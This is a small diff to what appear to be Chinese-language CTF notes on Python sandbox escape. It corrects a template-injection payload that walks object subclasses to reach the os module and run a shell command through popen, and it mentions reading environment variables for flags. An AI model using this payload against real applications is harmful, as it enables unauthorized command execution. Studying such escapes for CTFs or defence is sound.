@@ -83,6 +83,6 @@ os.environ                   # 读环境变量（常藏 flag）
 ### 找到含有os的子类,用下标锁定,然后使用原方案,此时已绕过元素限制获得类属性,按照上述的获取函数方法提取os模板即可
 
 ```
-().__class__.__mro__[1].__subclasses__(下标).__init__.__globals__['os'].popen('id').read()
+().__class__.__mro__[1].__subclasses__()[下标].__init__.__globals__['os'].popen('id').read()
 ```
 
